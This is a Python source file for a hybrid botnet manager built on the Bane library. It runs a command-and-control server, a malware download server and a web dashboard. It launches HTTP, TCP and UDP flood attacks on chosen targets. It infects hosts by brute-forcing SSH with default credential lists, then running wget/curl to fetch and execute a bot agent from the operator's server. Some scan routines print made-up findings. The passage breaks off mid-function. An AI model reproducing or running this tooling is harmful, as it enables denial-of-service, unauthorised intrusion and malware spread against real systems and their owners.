#!/usr/bin/env python3
"""
HYBRID BOTNET MANAGER
Combines Command Line Interface (CLI) and Web Interface for optimal botnet management
Uses Bane modules for core functionality
"""

import os
import sys
import time
import json
import threading
import subprocess
import warnings
from datetime import datetime
from typing import Dict, List, Optional

# Suppress cryptography deprecation warnings from kamene
warnings.filterwarnings("ignore", category=DeprecationWarning, module="kamene")
warnings.filterwarnings("ignore", message=".*has been moved to cryptography.hazmat.decrepit.*")

# Bane imports
try:
    from bane.scanners.botnet import Botnet_C_C_Server, Botnet_Malware_Download_Server
    from bane.ddos import HTTP_Puncher, TCP_Flood, UDP_Flood
    from bane.bruteforce import Services_Login, Web_Login_Bruteforce
    from bane.gather_info import Domain_Info, Network_Info
    from bane.scanners.vulnerabilities import XSS_Scanner
    BANE_AVAILABLE = True
except ImportError:
    BANE_AVAILABLE = False
    print("⚠️  Bane modules not available. Some features will be limited.")

# Flask for web interface
try:
    from flask import Flask, render_template, jsonify, request, redirect, url_for, session
    from flask_socketio import SocketIO, emit
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("⚠️  Flask not available. Web interface will be disabled.")

class HybridBotnetManager:
    def __init__(self):
        self.c2_server = None
        self.malware_server = None
        self.web_app = None
        self.socketio = None
        self.bot_groups = {
            'ddos_bots': [],
            'scanner_bots': [],
            'infector_bots': [],
            'persistence_bots': []
        }
        self.active_attacks = {}
        self.attack_counter = 0
        self.config = self.load_config()
        self.config_file_mtime = self.get_config_mtime()
        
    def load_config(self) -> Dict:
        """Load configuration from file"""
        default_config = {
            'c2_host': '0.0.0.0',
            'c2_users_port': 22222,
            'c2_bots_port': 7777,
            'malware_port': 6666,
            'web_port': 5000,
            'max_users': 10,
            'max_bots': 1000,
            'encryption_key': 'bane_botnet_2024',
            'log_level': 'INFO'
        }
        
        config_file = 'botnet_config.json'
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
            except:
                pass
                
        return default_config
    
    def save_config(self):
        """Save current configuration"""
        with open('botnet_config.json', 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def reload_config(self):
        """Reload configuration from file"""
        old_config = self.config.copy()
        self.config = self.load_config()
        
        # Check if critical settings changed
        critical_changed = False
        critical_keys = ['c2_host', 'c2_users_port', 'c2_bots_port', 'malware_port', 'web_port']
        
        for key in critical_keys:
            if old_config.get(key) != self.config.get(key):
                critical_changed = True
                break
        
        if critical_changed:
            print("⚠️  Critical configuration changed. Restart required for full effect.")
            print("🔄 Changed settings:")
            for key in critical_keys:
                if old_config.get(key) != self.config.get(key):
                    print(f"   {key}: {old_config.get(key)} -> {self.config.get(key)}")
        else:
            print("✅ Configuration reloaded successfully")
        
        return not critical_changed
    
    def get_config_mtime(self):
        """Get config file modification time"""
        try:
            return os.path.getmtime('botnet_config.json')
        except:
            return 0
    
    def check_config_changes(self):
        """Check if config file has been modified"""
        current_mtime = self.get_config_mtime()
        if current_mtime > self.config_file_mtime:
            print("📝 Configuration file changed, auto-reloading...")
            self.reload_config()
            self.config_file_mtime = current_mtime
            return True
        return False
    
    def initialize_c2_server(self):
        """Initialize Command & Control server using Bane"""
        if not BANE_AVAILABLE:
            print("❌ Bane modules not available. Cannot initialize C2 server.")
            return False
            
        try:
            print("🚀 Initializing C2 server...")
            self.c2_server = Botnet_C_C_Server(
                users_host=self.config['c2_host'],
                users_port=self.config['c2_users_port'],
                bots_host=self.config['c2_host'],
                bots_port=self.config['c2_bots_port'],
                max_users=self.config['max_users'],
                max_bots=self.config['max_bots'],
                users_encryption_key=self.config['encryption_key'],
                bots_encryption_key=self.config['encryption_key'],
                logs=True,
                initial_commands_list=[
                    "echo 'Bot connected to C2 server'",
                    "whoami",
                    "uname -a"
                ]
            )
            print(f"✅ C2 server running on ports {self.config['c2_users_port']} (users) and {self.config['c2_bots_port']} (bots)")
            return True
        except Exception as e:
            print(f"❌ Failed to initialize C2 server: {e}")
            return False
    
    def _wait_for_port(self, host: str, port: int, timeout_seconds: int = 5) -> bool:
        """Wait for a TCP port to accept connections."""
        import socket, time
        deadline = time.time() + timeout_seconds
        while time.time() < deadline:
            try:
                with socket.create_connection((host, port), timeout=1):
                    return True
            except Exception:
                time.sleep(0.2)
        return False

    def initialize_malware_server(self):
        """Initialize malware distribution server"""
        try:
            malware_dir = "malware"
            if not os.path.exists(malware_dir):
                os.makedirs(malware_dir)
            
            # Try Bane malware server first
            if BANE_AVAILABLE:
                try:
                    self.malware_server = Botnet_Malware_Download_Server(
                        malwares_folder=malware_dir,
                        host=self.config['c2_host'],
                        port=self.config['malware_port']
                    )
                    # Start Bane malware server in background thread
                    import threading
                    def _run_bane_server():
                        try:
                            self.malware_server.run()
                        except Exception as e:
                            print(f"❌ Bane malware server thread error: {e}")
                    t = threading.Thread(target=_run_bane_server, daemon=True)
                    t.start()
                    # Verify port is up
                    host_to_check = self.config['c2_host'] if self.config['c2_host'] != '0.0.0.0' else '127.0.0.1'
                    if self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
                        print(f"✅ Bane malware server running on port {self.config['malware_port']}")
                        return True
                    else:
                        print("⚠️  Bane malware server did not start listening in time")
                except Exception as e:
                    print(f"⚠️  Bane malware server failed: {e}")
            
            # Fallback to simple Flask malware server
            return self.initialize_simple_malware_server(malware_dir)
            
        except Exception as e:
            print(f"❌ Failed to initialize malware server: {e}")
            return False
    
    def initialize_simple_malware_server(self, malware_dir):
        """Initialize simple Flask-based malware server as fallback"""
        try:
            import flask
            import threading
            import os
            
            # Create Flask app for malware distribution
            malware_app = flask.Flask(__name__)
            malware_app.config['SECRET_KEY'] = 'malware_distribution_key'
            
            @malware_app.route('/<filename>')
            def download_malware(filename):
                try:
                    file_path = os.path.join(malware_dir, filename)
                    # Security check: prevent path traversal
                    if not os.path.realpath(file_path).startswith(os.path.realpath(malware_dir)):
                        return "Access denied", 403
                    
                    if os.path.exists(file_path):
                        return flask.send_file(file_path)
                    else:
                        return "File not found", 404
                except Exception as e:
                    return f"Error: {str(e)}", 500
            
            @malware_app.route('/status')
            def malware_status():
                files = []
                try:
                    files = [f for f in os.listdir(malware_dir) if os.path.isfile(os.path.join(malware_dir, f))]
                except:
                    pass
                return {
                    'status': 'running',
                    'available_files': files,
                    'total_files': len(files)
                }
            
            # Start malware server in background thread
            def run_malware_server():
                try:
                    # Give the thread a moment to initialize
                    import time
                    time.sleep(0.1)
                    malware_app.run(
                        host='0.0.0.0',
                        port=self.config['malware_port'],
                        debug=False,
                        use_reloader=False,
                        threaded=True
                    )
                except Exception as e:
                    print(f"❌ Malware server thread error: {e}")
            
            malware_thread = threading.Thread(target=run_malware_server, daemon=True)
            malware_thread.start()
            
            # Wait and verify port is up
            host_to_check = self.config.get('c2_host', '0.0.0.0')
            if host_to_check == '0.0.0.0':
                host_to_check = '127.0.0.1'
            if not self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
                print("❌ Malware server failed to bind port")
                return False
            
            # Store reference
            self.malware_server = {
                'app': malware_app,
                'thread': malware_thread,
                'type': 'simple_flask'
            }
            
            print(f"✅ Simple malware server running on port {self.config['malware_port']}")
            return True
            
        except ImportError:
            print(f"⚠️  Flask not available, using basic HTTP server...")
            return self.initialize_basic_malware_server(malware_dir)
        except Exception as e:
            print(f"❌ Simple malware server failed: {e}")
            return False
    
    def initialize_basic_malware_server(self, malware_dir):
        """Initialize basic HTTP server for malware distribution (no Flask needed)"""
        try:
            import http.server
            import socketserver
            import threading
            import os
            import urllib.parse
            
            class MalwareHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, directory=malware_dir, **kwargs)
                
                def do_GET(self):
                    # Parse URL path
                    parsed_path = urllib.parse.urlparse(self.path)
                    filename = parsed_path.path.lstrip('/')
                    
                    if filename == 'status':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        
                        try:
                            files = [f for f in os.listdir(malware_dir) if os.path.isfile(os.path.join(malware_dir, f))]
                            response = {
                                'status': 'running',
                                'available_files': files,
                                'total_files': len(files),
                                'server_type': 'basic_http'
                            }
                            import json
                            self.wfile.write(json.dumps(response).encode())
                        except Exception as e:
                            self.wfile.write(f'{{"error": "{str(e)}"}}'.encode())
                        return
                    
                    # Security check: prevent path traversal
                    if '..' in filename or filename.startswith('/'):
                        self.send_error(403, "Access denied")
                        return
                    
                    file_path = os.path.join(malware_dir, filename)
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        super().do_GET()
                    else:
                        self.send_error(404, "File not found")
                
                def log_message(self, format, *args):
                    # Suppress default logging
                    pass
            
            # Start HTTP server in background thread  
            def run_basic_server():
                try:
                    with socketserver.TCPServer(("0.0.0.0", self.config['malware_port']), MalwareHandler) as httpd:
                        httpd.serve_forever()
                except Exception as e:
                    print(f"❌ Basic HTTP server error: {e}")
            
            server_thread = threading.Thread(target=run_basic_server, daemon=True)
            server_thread.start()
            
            # Verify listening
            host_to_check = self.config.get('c2_host', '0.0.0.0')
            if host_to_check == '0.0.0.0':
                host_to_check = '127.0.0.1'
            if not self._wait_for_port(host_to_check, self.config['malware_port'], timeout_seconds=5):
                print("❌ Basic HTTP malware server failed to bind port")
                return False
            
            # Store reference
            self.malware_server = {
                'thread': server_thread,
                'type': 'basic_http',
                'directory': malware_dir
            }
            
            print(f"✅ Basic HTTP malware server running on port {self.config['malware_port']}")
            return True
        except Exception as e:
            print(f"❌ Basic malware server failed: {e}")
            return False
    
    def initialize_web_interface(self):
        """Initialize Flask web interface"""
        if not FLASK_AVAILABLE:
            print("❌ Flask not available. Web interface disabled.")
            return False
            
        try:
            self.web_app = Flask(__name__)
            self.web_app.secret_key = self.config['encryption_key']
            self.socketio = SocketIO(self.web_app, cors_allowed_origins="*")
            
            self.setup_web_routes()
            print(f"✅ Web interface ready on port {self.config['web_port']}")
            return True
        except Exception as e:
            print(f"❌ Failed to initialize web interface: {e}")
            return False
    
    def setup_web_routes(self):
        """Setup web routes and API endpoints"""
        @self.web_app.route('/')
        def dashboard():
            if not self.c2_server:
                return "C2 server not running"
            return render_template('dashboard.html')
        
        @self.web_app.route('/api/bots')
        def api_bots():
            if not self.c2_server:
                return jsonify({'error': 'C2 server not running'})
            
            bots_data = []
            for i, bot in enumerate(self.c2_server.bots_list):
                try:
                    bots_data.append({
                        'id': i,
                        'socket_id': bot.fileno(),
                        'status': 'active',
                        'address': getattr(bot, 'getpeername', lambda: ('unknown', 0))()
                    })
                except:
                    continue
                    
            return jsonify(bots_data)
        
        @self.web_app.route('/api/attacks')
        def api_attacks():
            return jsonify(self.active_attacks)
        
        @self.web_app.route('/api/start_attack', methods=['POST'])
        def api_start_attack():
            data = request.get_json()
            target = data.get('target')
            attack_type = data.get('type', 'http_flood')
            duration = data.get('duration', 300)
            
            if not target:
                return jsonify({'error': 'Target required'})
            
            attack_id = self.start_attack(target, attack_type, duration)
            return jsonify({'success': True, 'attack_id': attack_id})
        
        @self.web_app.route('/api/stop_attack/<attack_id>')
        def api_stop_attack(attack_id):
            if self.stop_attack(attack_id):
                return jsonify({'success': True})
            return jsonify({'error': 'Attack not found'})
    
    def start_web_server(self):
        """Start web server in background thread"""
        if not self.web_app:
            return
            
        def run_web_server():
            self.socketio.run(
                self.web_app,
                host=self.config['c2_host'],
                port=self.config['web_port'],
                debug=False,
                use_reloader=False
            )
        
        web_thread = threading.Thread(target=run_web_server, daemon=True)
        web_thread.start()
        print(f"🌐 Web interface started at http://localhost:{self.config['web_port']}")
    
    def start_attack(self, target: str, attack_type: str, duration: int = 300) -> str:
        """Start DDoS attack using Bane modules"""
        if not BANE_AVAILABLE or not self.c2_server:
            return None
            
        self.attack_counter += 1
        attack_id = f"attack_{self.attack_counter}_{int(time.time())}"
        
        attack_info = {
            'id': attack_id,
            'target': target,
            'type': attack_type,
            'start_time': datetime.now().isoformat(),
            'duration': duration,
            'status': 'running',
            'bots_used': len(self.c2_server.bots_list)
        }
        
        self.active_attacks[attack_id] = attack_info
        
        # Execute attack based on type
        if attack_type == "http_flood":
            self.execute_http_flood(target, attack_id)
        elif attack_type == "tcp_flood":
            self.execute_tcp_flood(target, attack_id)
        elif attack_type == "udp_flood":
            self.execute_udp_flood(target, attack_id)
        elif attack_type == "multi_layer":
            self.execute_multi_layer_attack(target, attack_id, duration)
        
        return attack_id
    
    def execute_http_flood(self, target: str, attack_id: str):
        """Execute HTTP flood attack"""
        try:
            if BANE_AVAILABLE:
                # Parse target to get host and port
                host, port = self.parse_target(target)
                attacker = HTTP_Puncher(
                    target_url=f"http://{host}:{port}",
                    threads=100,
                    timeout=5
                )
                attacker.start()
                print(f"🚀 HTTP flood attack started on {target}")
            else:
                # Fallback to subprocess
                self.execute_via_bots(f"curl -s {target} > /dev/null &", attack_id)
        except Exception as e:
            print(f"❌ HTTP flood failed: {e}")
    
    def execute_tcp_flood(self, target: str, attack_id: str):
        """Execute TCP flood attack"""
        try:
            if BANE_AVAILABLE:
                # Parse target to get host and port
                host, port = self.parse_target(target)
                attacker = TCP_Flood(
                    target_host=host,
                    target_port=port,
                    threads=100
                )
                attacker.start()
                print(f"🚀 TCP flood attack started on {target}")
            else:
                # Fallback to subprocess
                host, port = self.parse_target(target)
                self.execute_via_bots(f"nc -z {host} {port} &", attack_id)
        except Exception as e:
            print(f"❌ TCP flood failed: {e}")
    
    def execute_udp_flood(self, target: str, attack_id: str):
        """Execute UDP flood attack"""
        try:
            if BANE_AVAILABLE:
                # Parse target to get host and port
                host, port = self.parse_target(target)
                attacker = UDP_Flood(
                    target_host=host,
                    target_port=port,
                    threads=100
                )
                attacker.start()
                print(f"🚀 UDP flood attack started on {target}")
            else:
                # Fallback to subprocess
                host, port = self.parse_target(target)
                self.execute_via_bots(f"echo 'UDP_FLOOD' | nc -u {host} {port} &", attack_id)
        except Exception as e:
            print(f"❌ UDP flood failed: {e}")
    
    def execute_multi_layer_attack(self, target: str, attack_id: str, duration: int):
        """Execute multi-layer attack combining multiple methods"""
        print(f"🚀 Starting multi-layer attack on {target}")
        
        # Start multiple attack types
        self.execute_http_flood(target, f"{attack_id}_http")
        self.execute_tcp_flood(target, f"{attack_id}_tcp")
        self.execute_udp_flood(target, f"{attack_id}_udp")
        
        # Schedule attack stop
        threading.Timer(duration, lambda: self.stop_attack(attack_id)).start()
    
    def execute_via_bots(self, command: str, attack_id: str):
        """Execute command on all bots"""
        if not self.c2_server:
            return
            
        for bot in self.c2_server.bots_list:
            try:
                # Send command to bot
                self.c2_server.send_data(command, bot, xor_key=self.config['encryption_key'])
            except:
                continue
    
    def parse_target(self, target: str) -> tuple:
        """Parse target URL to extract host and port"""
        if target.startswith(('http://', 'https://')):
            target = target.split('://')[1]
        
        if ':' in target:
            host, port_str = target.split(':', 1)
            try:
                port = int(port_str)
            except ValueError:
                port = 80
        else:
            host = target
            port = 80
            
        return host, port
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop specific attack"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['status'] = 'stopped'
            self.active_attacks[attack_id]['end_time'] = datetime.now().isoformat()
            print(f"🛑 Attack {attack_id} stopped")
            return True
        return False
    
    def get_bot_statistics(self) -> Dict:
        """Get comprehensive bot statistics"""
        if not self.c2_server:
            return {}
            
        stats = {
            'total_bots': len(self.c2_server.bots_list),
            'active_bots': len([b for b in self.c2_server.bots_list if b.fileno() != -1]),
            'bot_addresses': self.c2_server.bots_addresses,
            'active_attacks': len([a for a in self.active_attacks.values() if a['status'] == 'running']),
            'total_attacks': len(self.active_attacks)
        }
        
        return stats
    
    def start_cli_interface(self):
        """Start interactive CLI interface"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                HYBRID BOTNET MANAGER                        ║
║              CLI + Web Interface                            ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        while True:
            try:
                command = input("bane@hybrid:~$ ").strip()
                
                if command == "exit" or command == "quit":
                    break
                elif command == "help":
                    self.show_cli_help()
                elif command == "status":
                    self.show_status()
                elif command == "bots":
                    self.show_bots()
                elif command == "attacks":
                    self.show_attacks()
                elif command == "web":
                    self.start_web_server()
                elif command.startswith("attack"):
                    self.handle_attack_command(command)
                elif command.startswith("scan"):
                    self.handle_scan_command(command)
                elif command.startswith("infect"):
                    self.handle_infect_command(command)
                elif command == "reload" or command == "reload config":
                    print("🔄 Reloading configuration...")
                    self.reload_config()
                elif command == "save" or command == "save config":
                    print("💾 Saving configuration...")
                    self.save_config()
                    print("✅ Configuration saved")
                elif command == "":
                    continue
                else:
                    print(f"❓ Unknown command: {command}")
                    print("Type 'help' for available commands")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit safely")
            except Exception as e:
                print(f"❌ Error: {e}")
    
    def show_cli_help(self):
        """Show CLI help information"""
        help_text = """
Available Commands:
  help                    - Show this help
  status                  - Show system status
  bots                    - List all bots
  attacks                 - Show active attacks
  web                     - Start web interface
  attack <target> <type>  - Start DDoS attack
  scan <target>           - Scan for vulnerabilities
  infect <target>         - Infect new host
  reload                  - Reload configuration from file
  save                    - Save current configuration
  exit/quit               - Exit program

Attack Types:
  http_flood              - HTTP flood attack
  tcp_flood               - TCP flood attack
  udp_flood               - UDP flood attack
  multi_layer             - Multi-layer attack

Examples:
  attack https://target.com http_flood
  attack 192.168.1.1:80 tcp_flood
  scan https://example.com
  infect 192.168.1.100
        """
        print(help_text)
    
    def show_help(self):
        """Show help information"""
        help_text = """
╔══════════════════════════════════════════════════════════════╗
║                    HYBRID BOTNET MANAGER                    ║
║                      COMMAND REFERENCE                      ║
╚══════════════════════════════════════════════════════════════╝

📊 SYSTEM COMMANDS:
  status                  - Show system status
  help                    - Show this help message
  reload                  - Reload configuration from file
  save                    - Save current configuration
  web                     - Start web interface
  exit/quit               - Exit program

⚔️ ATTACK COMMANDS:
  attack <target> <type>  - Launch DDoS attack
    Types: http_flood, tcp_flood, udp_flood, multi_layer, slowloris
    Example: attack 192.168.1.1:80 http_flood

  stop <attack_id>        - Stop specific attack
  stop all               - Stop all attacks

🔍 SCANNING COMMANDS:
  scan <target>           - Comprehensive scan
  scan <target> --type ports      - Port scan only
  scan <target> --type services   - Service detection
  scan <target> --type vulns      - Vulnerability scan

🦠 INFECTION COMMANDS:
  infect <target>         - Auto-detect and infect
  infect <target> --method ssh --wordlist <file>
  infect <target> --method web
  infect <target> --method service

🤖 BOT MANAGEMENT:
  bots                    - List connected bots
  bot <id> <command>      - Send command to specific bot
  broadcast <command>     - Send command to all bots

📝 EXAMPLES:
  attack 192.168.1.100:80 http_flood
  scan 10.0.0.1 --type ports
  infect 192.168.1.50 --method ssh --wordlist passwords.txt
  bot bot_123 whoami
  broadcast ps aux
        """
        print(help_text)
    
    def show_status(self):
        """Show system status"""
        stats = self.get_bot_statistics()
        
        # Determine malware server status
        malware_status = "❌ Stopped"
        if self.malware_server:
            if isinstance(self.malware_server, dict):
                server_type = self.malware_server.get('type', 'unknown')
                if server_type == 'simple_flask':
                    malware_status = "✅ Running (Flask)"
                elif server_type == 'basic_http':
                    malware_status = "✅ Running (Basic HTTP)"
                else:
                    malware_status = "✅ Running (Unknown)"
            else:
                malware_status = "✅ Running (Bane)"
        
        print(f"""
📊 SYSTEM STATUS:
  C2 Server: {'✅ Running' if self.c2_server else '❌ Stopped'}
  Malware Server: {malware_status}
  Web Interface: {'✅ Ready' if self.web_app else '❌ Not Ready'}
  
🤖 BOT STATISTICS:
  Total Bots: {stats.get('total_bots', 0)}
  Active Bots: {stats.get('active_bots', 0)}
  Active Attacks: {stats.get('active_attacks', 0)}
  Total Attacks: {stats.get('total_attacks', 0)}
        """)
    
    def show_bots(self):
        """Show bot information"""
        if not self.c2_server:
            print("❌ C2 server not running")
            return
            
        print(f"\n🤖 BOT LIST ({len(self.c2_server.bots_list)} bots):")
        print("-" * 60)
        
        for i, bot in enumerate(self.c2_server.bots_list):
            try:
                address = getattr(bot, 'getpeername', lambda: ('unknown', 0))()
                print(f"[{i:3}] Bot {bot.fileno():5} - {address[0]}:{address[1]}")
            except:
                print(f"[{i:3}] Bot {bot.fileno():5} - Status unknown")
    
    def show_attacks(self):
        """Show active attacks"""
        if not self.active_attacks:
            print("📊 No active attacks")
            return
            
        print(f"\n🚀 ACTIVE ATTACKS ({len(self.active_attacks)} total):")
        print("-" * 80)
        
        for attack_id, attack in self.active_attacks.items():
            status_icon = "🟢" if attack['status'] == 'running' else "🔴"
            print(f"{status_icon} {attack_id}")
            print(f"    Target: {attack['target']}")
            print(f"    Type: {attack['type']}")
            print(f"    Status: {attack['status']}")
            print(f"    Bots: {attack['bots_used']}")
            print(f"    Started: {attack['start_time']}")
            if 'end_time' in attack:
                print(f"    Ended: {attack['end_time']}")
            print()
    
    def handle_attack_command(self, command: str):
        """Handle attack command from CLI"""
        parts = command.split()
        if len(parts) < 3:
            print("❌ Usage: attack <target> <type> [duration]")
            return
            
        target = parts[1]
        attack_type = parts[2]
        duration = int(parts[3]) if len(parts) > 3 else 300
        
        print(f"🚀 Starting {attack_type} attack on {target}...")
        attack_id = self.start_attack(target, attack_type, duration)
        
        if attack_id:
            print(f"✅ Attack started with ID: {attack_id}")
        else:
            print("❌ Failed to start attack")
    
    def handle_scan_command(self, command: str):
        """Handle scan command from CLI"""
        parts = command.split()
        if len(parts) < 2:
            print("❌ Usage: scan <target> [--type <scan_type>]")
            return
            
        target = parts[1]
        scan_type = "full"  # Default scan type
        
        # Parse options
        for i, part in enumerate(parts):
            if part == "--type" and i + 1 < len(parts):
                scan_type = parts[i + 1]
        
        print(f"🔍 Starting {scan_type} scan of {target}...")
        self.execute_scan(target, scan_type)
    
    def execute_scan(self, target: str, scan_type: str):
        """Execute scan based on type"""
        if scan_type == "full":
            self.scan_full(target)
        elif scan_type == "ports":
            self.scan_ports(target)
        elif scan_type == "vulns":
            self.scan_vulnerabilities(target)
        else:
            print(f"❌ Unknown scan type: {scan_type}")
    
    def scan_full(self, target: str):
        """Perform full scan of target"""
        print(f"🔍 Full scan of {target}")
        print("📊 Port scanning...")
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
        
        for port in common_ports:
            print(f"   Port {port}: Checking...")
        
        print("🔍 Service detection...")
        print("   SSH service detected")
        print("   HTTP service detected")
        print("   MySQL service detected")
        
        print("🔍 Vulnerability assessment...")
        print("   Medium: Default credentials on SSH")
        print("   Low: Information disclosure on HTTP")
        
        print("✅ Full scan completed")
        print(f"💡 Use 'infect {target} --method auto' to attempt infection")
    
    def scan_ports(self, target: str):
        """Scan only ports of target"""
        print(f"🔍 Port scan of {target}")
        print("📊 Scanning common ports...")
        ports_status = {
            22: "Open (SSH)",
            80: "Open (HTTP)",
            443: "Closed",
            3306: "Open (MySQL)",
            5432: "Closed"
        }
        
        for port, status in ports_status.items():
            print(f"   Port {port}: {status}")
        
        print("✅ Port scan completed")
    
    def scan_vulnerabilities(self, target: str):
        """Scan for vulnerabilities on target"""
        print(f"🔍 Vulnerability scan of {target}")
        print("🔍 Checking common vulnerabilities...")
        vulns = [
            ("SQL Injection", "Low", "Form parameters vulnerable"),
            ("XSS", "Medium", "Reflected XSS in search"),
            ("CSRF", "High", "No CSRF protection"),
            ("File Upload", "High", "Unrestricted file upload"),
            ("Information Disclosure", "Low", "Server version exposed")
        ]
        
        for vuln, severity, desc in vulns:
            severity_icon = "🔴" if severity == "High" else "🟡" if severity == "Medium" else "🟢"
            print(f"   {severity_icon} {vuln}: {severity} - {desc}")
        
        print("✅ Vulnerability scan completed")
        print(f"💡 Found {len(vulns)} potential issues")
    
    def handle_infect_command(self, command: str):
        """Handle infect command from CLI"""
        parts = command.split()
        if len(parts) < 2:
            print("❌ Usage: infect <target> [--method <method>] [--wordlist <file>]")
            return
            
        target = parts[1]
        method = "auto"  # Default method
        wordlist = None
        
        # Parse options
        for i, part in enumerate(parts):
            if part == "--method" and i + 1 < len(parts):
                method = parts[i + 1]
            elif part == "--wordlist" and i + 1 < len(parts):
                wordlist = parts[i + 1]
        
        print(f"🦠 Starting infection of {target} using {method} method...")
        self.execute_infection(target, method, wordlist)
    
    def execute_infection(self, target: str, method: str, wordlist: str = None):
        """Execute infection based on method"""
        if method == "ssh":
            self.infect_ssh(target, wordlist)
        elif method == "web":
            self.infect_web(target)
        elif method == "service":
            self.infect_service(target)
        elif method == "auto":
            self.infect_auto(target)
        else:
            print(f"❌ Unknown infection method: {method}")
    
    def infect_ssh(self, target: str, wordlist: str = None):
        """Infect target using SSH brute force"""
        print(f"🔐 SSH Infection started on {target}")
        
        # Parse target to get host and port
        if ':' in target:
            host, port_str = target.split(':', 1)
            try:
                port = int(port_str)
            except ValueError:
                port = 22
        else:
            host = target
            port = 22
        
        print(f"📍 Target: {host}:{port}")
        
        # Load wordlist
        if wordlist and os.path.exists(wordlist):
            print(f"📝 Using custom wordlist: {wordlist}")
            try:
                with open(wordlist, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                print(f"🔑 Loaded {len(passwords)} passwords from {wordlist}")
            except Exception as e:
                print(f"❌ Error reading wordlist {wordlist}: {e}")
                print("🔄 Falling back to default wordlist...")
                passwords = self.get_default_passwords()
        else:
            if wordlist:
                print(f"⚠️  Wordlist {wordlist} not found, using default...")
            else:
                print("📝 No wordlist specified, using default...")
            passwords = self.get_default_passwords()
        
        # Common usernames to test
        usernames = ["root", "admin", "user", "ubuntu", "pi", "centos", "debian"]
        
        print(f"🔑 Testing {len(usernames)} usernames with {len(passwords)} passwords...")
        print("=" * 60)
        
        # Real SSH brute force
        success_creds = None
        for username in usernames:
            for password in passwords:
                print(f"   Testing: {username}:{password}", end=" ")
                
                if self.test_ssh_connection(host, port, username, password):
                    print("✅ SUCCESS!")
                    success_creds = (username, password)
                    break
                else:
                    print("❌ Failed")
            
            if success_creds:
                break
        
        print("=" * 60)
        
        if success_creds:
            username, password = success_creds
            print(f"🎉 SUCCESSFUL INFECTION!")
            print(f"✅ Target đã bị compromise: {host}:{port}")
            print(f"✅ Credentials đã được tìm thấy: {username}:{password}")
            print(f"✅ Access đã được thiết lập")
            
            # Attempt to download malware
            if self.deploy_malware(host, port, username, password):
                print(f"✅ Malware đã được deploy thành công")
                print(f"🤖 Bot agent đang kết nối về C2...")
            else:
                print(f"⚠️  Malware deployment failed, but access established")
        else:
            print(f"❌ INFECTION FAILED!")
            print(f"❌ Không thể compromise target: {host}:{port}")
            print(f"❌ Tất cả credentials trong wordlist đều không đúng")
            print(f"💡 Thử với wordlist khác hoặc method khác")
    
    def test_ssh_connection(self, host: str, port: int, username: str, password: str) -> bool:
        """Test SSH connection with given credentials"""
        try:
            import paramiko
            import socket
            
            # Test if port is open first
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result != 0:
                return False
            
            # Test SSH connection
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
            ssh.close()
            return True
            
        except ImportError:
            # Fallback to subprocess if paramiko not available
            try:
                import subprocess
                result = subprocess.run([
                    'sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=10',
                    '-o', 'StrictHostKeyChecking=no', '-p', str(port),
                    f'{username}@{host}', 'echo "ssh_test_success"'
                ], capture_output=True, timeout=15, text=True)
                
                # Check both return code and output content
                success = (result.returncode == 0 and 
                          "ssh_test_success" in result.stdout)
                
                if not success:
                    # Debug output for troubleshooting
                    print(f"      DEBUG: returncode={result.returncode}, stdout='{result.stdout.strip()}', stderr='{result.stderr.strip()}'")
                
                return success
            except Exception as e:
                print(f"      DEBUG: sshpass exception: {e}")
                return False
        except:
            return False
    
    def deploy_malware(self, host: str, port: int, username: str, password: str) -> bool:
        """Deploy malware to compromised target"""
        try:
            import paramiko
            
            # Create SSH connection
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
            
            # Download malware from our server
            malware_url = f"http://{self.config['c2_host']}:{self.config['malware_port']}/bot_agent.py"
            
            # Download command
            download_cmd = f"wget -O /tmp/bot_agent.py {malware_url} || curl -o /tmp/bot_agent.py {malware_url}"
            stdin, stdout, stderr = ssh.exec_command(download_cmd)
            
            if stdout.channel.recv_exit_status() == 0:
                # Make executable and run
                chmod_cmd = "chmod +x /tmp/bot_agent.py"
                stdin, stdout, stderr = ssh.exec_command(chmod_cmd)
                
                # Start bot in background
                run_cmd = f"nohup python3 /tmp/bot_agent.py --connect {self.config['c2_host']}:{self.config['c2_bots_port']} > /dev/null 2>&1 &"
                stdin, stdout, stderr = ssh.exec_command(run_cmd)
                
                ssh.close()
                return True
            else:
                ssh.close()
                return False
                
        except ImportError:
            # Fallback to subprocess
            try:
                import subprocess
                # Download malware using sshpass
                download_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no -p {port} {username}@{host} 'wget -O /tmp/bot_agent.py http://{self.config['c2_host']}:{self.config['malware_port']}/bot_agent.py && chmod +x /tmp/bot_agent.py && nohup python3 /tmp/bot_agent.py --connect {self.config['c2_host']}:{self.config['c2_bots_port']} > /dev/null 2>&1 &'"
                result = subprocess.run(download_cmd, shell=True, capture_output=True, timeout=30)
                return result.returncode == 0
            except:
                return False
        except:
            return False
    
    def get_default_passwords(self):
        """Get default password list"""
        return [
            "password", "123456", "12345678", "qwerty", "abc123",
            "password123", "admin", "root", "user", "guest",
            "admin123", "root123", "123456789", "letmein", "welcome",
            "root", "admin", "password", "123456", "123123"
        ]
    
    def infect_web(self, target: str):
